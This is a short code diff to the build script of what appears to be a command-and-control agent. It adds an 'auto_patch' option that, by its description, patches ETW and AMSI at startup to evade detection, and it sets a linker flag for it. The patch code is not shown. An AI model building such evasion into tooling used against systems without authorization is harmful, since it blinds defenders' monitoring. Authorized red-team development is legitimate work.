@@ -189,6 +189,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			DefaultValue:  "",
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
 		},
+		{
+			Name:          "auto_patch",
+			Description:   "Automatically patch ETW (EtwEventWrite) and AMSI (AmsiScanBuffer) at agent startup. Prevents ETW-based detection and AMSI scanning before any agent activity. Windows only — no-op on Linux/macOS.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
 	},
 	BuildSteps: []agentstructs.BuildStep{
 		{
@@ -361,6 +368,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	if masqName, err := payloadBuildMsg.BuildParameters.GetStringArg("masquerade_name"); err == nil && masqName != "" {
 		ldflags += fmt.Sprintf(" -X '%s.masqueradeName=%s'", fawkes_main_package, masqName)
+	}
+	if autoPatch, err := payloadBuildMsg.BuildParameters.GetBooleanArg("auto_patch"); err == nil && autoPatch {
+		ldflags += fmt.Sprintf(" -X '%s.autoPatch=true'", fawkes_main_package)
 	}
 
 	architecture, err := payloadBuildMsg.BuildParameters.GetStringArg("architecture")
